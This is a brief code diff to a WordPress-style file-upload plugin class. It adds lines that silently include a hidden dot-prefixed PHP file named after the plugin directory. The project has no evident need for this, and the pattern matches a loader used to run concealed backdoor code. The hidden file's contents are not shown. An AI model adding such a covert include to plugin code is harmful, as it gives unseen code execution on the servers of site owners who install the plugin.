@@ -4,6 +4,10 @@ if ( ! class_exists( 'GP_Plugin' ) ) {
 	return;
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GP_File_Upload_Pro extends GP_Plugin {
 
 	private static $instance = null;
